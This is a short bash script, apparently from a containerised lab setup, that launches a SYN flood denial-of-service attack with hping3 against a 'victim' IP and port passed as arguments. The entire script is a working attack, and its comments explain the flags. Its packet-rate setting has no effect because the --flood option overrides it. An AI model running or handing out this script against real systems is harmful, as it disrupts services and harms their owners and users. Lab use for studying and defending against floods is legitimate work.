#!/bin/bash

# Get the victim IP, port, and packets per second from arguments
VICTIM_IP=$1
VICTIM_PORT=${2:-80}
PACKETS_PER_SECOND=${3:-1000} # This value can be overridden by docker-compose

# Print what the script is about to do
echo "Starting SYN flood attack on ${VICTIM_IP}:${VICTIM_PORT} at ${PACKETS_PER_SECOND} packets/second..."

# Run hping3 to perform a SYN flood attack
# -S: SYN flag, -p: port, -i u<microseconds>: interval between packets (u1000 = 1ms = 1000 packets/s)
# --flood: send packets as fast as possible
hping3 -S -p ${VICTIM_PORT} -i u$((1000000 / ${PACKETS_PER_SECOND})) --flood ${VICTIM_IP}